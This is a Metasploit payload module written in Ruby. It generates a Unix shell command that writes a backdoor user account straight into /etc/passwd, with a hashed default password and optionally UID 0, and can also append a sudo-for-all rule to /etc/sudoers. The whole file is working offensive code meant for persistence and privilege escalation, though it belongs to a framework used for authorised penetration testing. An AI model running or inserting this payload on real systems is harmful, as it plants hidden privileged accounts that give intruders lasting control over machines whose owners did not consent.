##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 8

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Add user with useradd',
        'Description' => %q{
          Creates a new user. By default the new user is set with sudo
          but other options exist to make the new user automatically
          root but this is not automatically set since the new user will
          be treated as root (and login may be difficult). The new user
          can also be set as just a standard user if desired.
        },
        'Author' => 'Nick Cottrell <Rad10Logic>',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::None,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'generic',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
      )

    register_options(
      [
        OptString.new('USER', [ true, 'The username to create', 'metasploit' ]),
        OptString.new('PASS', [ true, 'The password for this user', 'Metasploit$1' ])
      ]
    )

    register_advanced_options(
      [
        OptEnum.new('RootMethod', [false, 'Set the method that the new user can obtain root', 'SUDO', ['SUID', 'SUDO', 'NONE']]),
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    suid = if datastore['RootMethod'] == 'SUID'
             '0'
           else
             rand(1010..1999).to_s
           end
    payload_cmd = "echo \'#{datastore['USER']}:#{datastore['PASS'].crypt('Az')}:#{suid}:#{suid}::/:/bin/sh\'>>/etc/passwd"
    if datastore['RootMethod'] == 'SUDO'
      payload_cmd += ";echo \'[ -f /etc/sudoers ]&&(echo \'#{datastore['USER']} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
    end
    payload_cmd
  end
end
